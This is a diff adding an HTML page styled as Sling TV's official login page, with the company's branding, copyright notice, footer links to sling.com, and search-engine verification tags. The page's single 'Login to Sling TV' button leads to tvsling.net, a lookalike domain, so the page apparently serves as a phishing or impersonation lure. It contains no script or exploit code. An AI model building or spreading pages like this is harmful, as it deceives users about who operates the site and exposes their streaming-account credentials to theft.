@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sling TV Login | Access Live TV Streaming</title>
+    <link rel="icon" href="https://www.sling.com/favicon.ico" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<meta name="msvalidate.01" content="649552A7F8FC8C674CD07172F20F2D02" />
+<meta name="google-site-verification" content="lU6MgVAmLQXn6EdigLoRQJ7jv9PkygMrLRQtjbuk5xQ" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #FF6F00; /* Sling TV orange */
+            --primary-light: #FFE0B2;
+            --primary-dark: #E65100;
+            --secondary: #212121;
+            --light: #757575;
+            --lighter: #F5F5F5;
+            --white: #FFFFFF;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        body {
+            background-color: var(--white);
+            color: var(--secondary);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        
+        header {
+            background: #00B5EB;
+            padding: 60px 0;
+            text-align: center;
+            margin-bottom: 40px;
+            border-radius: 0 0 30px 30px;
+            box-shadow: 0 10px 30px rgba(255, 111, 0, 0.2);
+        }
+        
+        .logo-container {
+            margin-bottom: 20px;
+        }
+        
+        .sling-logo {
+            height: 50px;
+            width: auto;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            opacity: 0.9;
+        }
+        
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin: 40px 0;
+        }
+        
+        .login-btn-container {
+            margin: 40px 0;
+        }
+        
+        .login-btn {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 16px 50px;
+            border-radius: 8px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+        
+        .login-btn:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 111, 0, 0.3);
+        }
+        
+        .content-section {
+            max-width: 800px;
+            margin: 0 auto 60px;
+            text-align: center;
+        }
+        
+        .content-section h2 {
+            color: var(--primary);
+            margin-bottom: 25px;
+            font-size: 2rem;
+        }
+        
+        .content-section p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            line-height: 1.7;
+        }
+        
+        .features {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin: 60px 0;
+        }
+        
+        .feature-card {
+            background: var(--lighter);
+            border-radius: 12px;
+            padding: 30px;
+            width: 280px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .feature-icon {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+        
+        .feature-card h3 {
+            margin-bottom: 15px;
+            color: var(--secondary);
+        }
+        
+        .channel-list {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            margin: 40px 0;
+        }
+        
+        .channel-logo {
+            height: 50px;
+            width: auto;
+            opacity: 0.8;
+            transition: opacity 0.3s ease;
+        }
+        
+        .channel-logo:hover {
+            opacity: 1;
+        }
+        
+        footer {
+            background-color: var(--secondary);
+            color: var(--white);
+            padding: 40px 0;
+            text-align: center;
+            margin-top: 60px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: var(--white);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: #BDBDBD;
+            font-size: 0.9rem;
+            margin-top: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .subtitle {
+                font-size: 1rem;
+            }
+            
+            .login-btn {
+                padding: 14px 40px;
+                font-size: 1.1rem;
+            }
+            
+            .content-section h2 {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo-container">
+                <img src="https://planetdish.com/wp-content/uploads/2021/12/Sling-TV-Logo.png" alt="Sling TV Logo" class="sling-logo">
+            </div>
+            <h1>Stream Live TV Your Way</h1>
+            <p class="subtitle">Access your favorite channels, shows, and movies with Sling TV's flexible streaming plans</p>
+        <div class="login-btn-container">
+                <a href="https://tvsling.net" class="login-btn">Login to Sling TV</a>
+            </div>
+        </header>
+    </header>
+    
+    <div class="container">
+        <div class="main-content">
+            
+            
+            <div class="content-section">
+                <h2>Why Choose Sling TV?</h2>
+                <p>Sling TV revolutionized live TV streaming by offering affordable, customizable packages without contracts or hidden fees. With Sling, you get to choose the channels you actually watch, saving money compared to traditional cable.</p>
+                <p>Our service works on all your favorite devices - smart TVs, streaming players, gaming consoles, phones, and tablets. Watch at home or on the go with our easy-to-use apps.</p>
+            </div>
+            
+            <div class="features">
+                <div class="feature-card">
+                    <div class="feature-icon">📺</div>
+                    <h3>Live TV</h3>
+                    <p>Stream popular cable channels live as they air, including sports, news, and entertainment</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">⏺️</div>
+                    <h3>Cloud DVR</h3>
+                    <p>Record your favorite shows with 50 hours of storage included (upgrade available)</p>
+                </div>
+                
+                <div class="feature-card">
+                    <div class="feature-icon">🎬</div>
+                    <h3>On Demand</h3>
+                    <p>Thousands of movies and TV episodes available whenever you want to watch</p>
+                </div>
+            </div>
+            
+            <div class="content-section">
+                <h2>Popular Channels on Sling</h2>
+                <p>Sling TV offers different channel lineups in our Orange and Blue packages, with options to add premium networks and international programming.</p>
+                
+                
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="https://www.sling.com">Home</a>
+                <a href="https://www.sling.com/service">Channel Packages</a>
+                <a href="https://www.sling.com/devices">Supported Devices</a>
+                <a href="https://www.sling.com/help">Help Center</a>
+                <a href="https://www.sling.com/account">My Account</a>
+            </div>
+            <div class="copyright">
+                © 2024 Sling TV L.L.C. All rights reserved. Sling is a registered trademark of Sling TV L.L.C.
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
